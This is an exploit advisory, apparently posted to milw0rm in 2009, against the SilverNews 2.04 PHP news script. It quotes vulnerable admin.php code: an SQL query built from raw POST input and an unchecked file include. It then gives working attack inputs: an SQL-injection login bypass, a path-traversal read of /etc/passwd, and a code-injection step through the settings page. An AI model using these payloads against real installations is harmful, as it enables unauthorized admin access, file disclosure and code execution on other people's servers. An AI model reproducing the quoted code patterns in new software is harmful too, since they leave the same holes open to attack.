<html><head><title>SilverNews 2.04 (Auth Bypass/LFI/RCE) Multiple Vulnerabilities</title></head><pre>#########################################################################################
[0x01] Informations:

Name           : SilverNews 2.04
Download       :
http://www.silver-scripts.de/scripts.php?script=SilverNews&amp;l=en
Vulnerability  : Auth Bypass\LFI\RCE
Author         : x0r
Contact        : andry2000@hotmail.it
Notes          : Proud to be Italian
#########################################################################################
[0x02] Bug:

Bugged file is /[path]/admin.php

[Code]
	// Get the user information from the database
	$getinfo = $sql-&gt;query(&quot;SELECT password, username, id FROM
sn&quot;.$sql-&gt;prefix.&quot;_user WHERE username = '&quot;.$_POST['username'].&quot;' AND
password = '&quot;.$_POST['password'].&quot;'&quot;);
	$info = $sql-&gt;fetch_array($getinfo);
...

	// If &quot;act&quot; isn't set the user will be sent to the homepage.
	if (!$_GET['act'] AND !$_POST['act'] AND !$_GET['section'])
	{
		$_GET['section'] = 'home';
	}

	require &quot;admin/header.php&quot;;

	if (file_exists('admin/'.$_GET['section'].&quot;.php&quot;))
	{
		require 'admin/'.$_GET['section'].'.php'; #LFI
	}
	else
	{
		$admin-&gt;error('Datei konnte nicht gefunden werden!');
	}

	require &quot;admin/footer.php&quot;;
[/code]

#########################################################################################


#########################################################################################
[0x03] Exploit:

Exploit: username: ' or '1=1
         password: x0r

LFI: admin.php?section=../../../../../../../../../../etc/passwd%00

RCE:
So we can bypass the admin login and then go to admin/settings.php and put your
evil code ^^ ex: 'show_cat_prefix' =&gt; $_POST['show_cat_prefix'], in the sho_cat_prefix we
put: x0r'; echo 'lol   --&gt; /data.inc.php

########################################################################################

# milw0rm.com [2009-02-06]</pre></html>